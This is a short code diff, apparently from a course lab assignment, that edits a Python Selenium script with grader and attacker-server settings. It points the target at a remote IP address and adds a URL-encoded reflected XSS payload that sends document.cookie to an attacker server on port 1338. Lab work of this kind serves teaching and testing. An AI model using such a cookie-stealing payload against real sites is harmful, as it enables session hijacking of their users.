@@ -6,8 +6,8 @@ import grader
 import argparse
 
 # NOTE: If you choose to run the servers on different ports for testing, please remember to set it back before submission.
-TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
-# TARGET_SERVER_ENDPOINT = 'http://35.223.68.134:80'
+# TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
+TARGET_SERVER_ENDPOINT = 'http://35.223.68.134:80'
 
 # NOTE: where you need to update your static IP address of your server
 ATTACKER_SERVER_ENDPOINT = 'http://localhost:1338'
@@ -20,9 +20,14 @@ def xss(vuln_type, level):
     options.add_argument("--headless")
     driver = webdriver.Firefox(options=options)  # Starts the browser
 
-    driver.get(TARGET_SERVER_ENDPOINT)  # Makes a request to the specified URL.
+    # driver.get(TARGET_SERVER_ENDPOINT)  # Makes a request to the specified URL.
 
     # DO SOMETHING
+
+    if vuln_type == '1':
+        if level == 'low':
+            url = TARGET_SERVER_ENDPOINT + '/xss/1/low?comment=%3Cscript%3Ewindow.open%28%22http%3A%2F%2F127.0.0.1%3A1338%2Fxss%2Flow%3Fcookie%3D123%22%20%2B%20document.cookie%29%3C%2Fscript%3E'
+            driver.get(url)
 
     # Grader verification should be done in attacker_server/server.py
 
